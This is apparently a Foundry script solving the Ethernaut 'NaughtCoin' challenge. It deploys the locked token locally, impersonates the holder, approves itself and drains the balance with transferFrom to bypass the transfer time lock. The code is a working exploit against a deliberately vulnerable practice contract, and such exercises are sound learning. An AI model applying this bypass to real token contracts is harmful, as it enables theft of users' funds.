// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/NaughtCoin.sol";

contract NaughtCoinHack is Script {
    NaughtCoin public coin;
    address public eoa = address(1024);

    function run() public {
        coin = new NaughtCoin(eoa);

        uint256 amount = coin.balanceOf(eoa);
        console.log("Before:", amount);

        vm.startPrank(eoa);
        coin.approve(address(this), amount);
        vm.stopPrank();

        coin.transferFrom(eoa, address(this), amount);

        console.log("After:", coin.balanceOf(eoa));
    }
}
